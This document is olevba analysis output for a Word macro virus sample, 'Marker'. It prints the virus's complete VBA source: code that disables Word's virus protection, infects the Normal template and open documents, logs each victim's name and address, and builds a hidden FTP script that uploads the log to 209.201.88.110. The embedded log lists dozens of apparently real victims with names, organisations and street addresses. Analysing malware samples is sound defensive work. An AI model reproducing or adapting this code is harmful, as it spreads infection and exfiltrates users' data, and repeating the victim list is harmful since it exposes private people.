olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-fdc852aeefd8012b56fdd2de1eeec6921f8f36ad
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-fdc852aeefd8012b56fdd2de1eeec6921f8f36ad - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            
            
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
Exitub:
               Next i
    End If
End If
End Sub










































Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 09:23:32 AM - Wednesday, 23 Dec 1998
' bcbsa
'



' 12:08:05 PM - Monday, 4 Jan 1999
' ISG
'



' 02:41:37 PM - Tuesday, 5 Jan 1999
' Information Systems Group
'



' 12:49:03 PM - Saturday, 9 Jan 1999
' Mona Sowisky
' CSC Healthcare
' One Embarcadero, Suite 2800
' San Francisco, CA 94111



' 10:30:59 PM - Sunday, 10 Jan 1999
' Information Systems
' CSC Healthcare
' 1675 Broadway, 18th Floor
' New York, NY 10019



' 09:25:05 PM - Monday, 11 Jan 1999
' Marge Bayus
'



' 09:58:40 AM - Wednesday, 20 Jan 1999
' Metron, Inc. (SSD)
'



' 01:22:07 PM - Tuesday, 26 Jan 1999
' CDR James Miller
'



' 11:02:23 AM - Thursday, 28 Jan 1999
' RAYMOND
'



' 08:57:05 AM - Friday, 29 Jan 1999
' CHARLES
'



' 11:09:52 AM - Tuesday, 2 Feb 1999
' FRANK
'



' 01:50:05 PM - Tuesday, 2 Feb 1999
' JAMES
'



' 03:11:38 PM - Thursday, 4 Feb 1999
' cipriano.donald.d
'



' 05:07:15 PM - Friday, 5 Feb 1999
' myers.patrick.d
'



' 03:55:22 PM - Wednesday, 10 Feb 1999
' vasel.alexander.n
'



' 07:37:19 AM - Friday, 19 Feb 1999
' herrmann.robert.c
'



' 07:18:25 AM - Monday, 1 Mar 1999
' gasang.edwin.m
'



' 08:35:15 AM - Wednesday, 10 Mar 1999
' DTC(SW/AW) Steve Perez
'



' 01:14:08 AM - Tuesday, 16 Mar 1999
' xo admin
'



' 09:08:17 AM - Friday, 19 Mar 1999
' Preferred Customer
'



' 02:41:09 PM - Monday, 19 Apr 1999
' Marvin Crumb
'



' 12:03:06  - lundi, 31 mai 1999
' Monique Dufaux
'



' 05:08:30  - jeudi, 3 juin 1999
' Rudaz Serge
'



' 07:41:41  - pondelok, 7 VI 1999
' Ing. Milan Cepko
'



' 09:36:40  - pondelok, 14 VI 1999
' Divizia 300
'



' 08:11:36  - utorok, 13 VII 1999
' Slovakova
'



' 02:46:49  - utorok, 13 VII 1999
' Ing. Peter KAŠPAR
'



' 12:05:24  - pondelok, 26 VII 1999
' Administrator
'



' 03:31:16  - pondelok, 2 VIII 1999
' Dekanova Maria
'



' 12:21:31  - pondelok, 23 VIII 1999
' RNDr. Jozef Morávek, CSc.
'



' 10:22:14  - štvrtok, 9 IX 1999
' Bardejovské kúpele
'



' 10:21:08  - štvrtok, 25 XI 1999
' PRAMEN s.r.o.
'



' 12:38:43  - pondelok, 10 IV 2000
' Hajduk
'



' 10:12:57  - utorok, 19 IX 2000
' PC8
'



' 11:01:31  - utorok, 10 X 2000
' Ing.Jankaj
'



' 03:26:23  - piatok, 27 X 2000
' PC5-3
'



' 10:37:24  - utorok, 7 XI 2000
' Noname
'



' 12:33:18  - streda, 6 XII 2000
' InKlub 4
' Slovakia
'   Zigova Veronika
'   Hviezdoslavova 16/1
'   Nova Dubnica, 01851
'   Slovakia



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

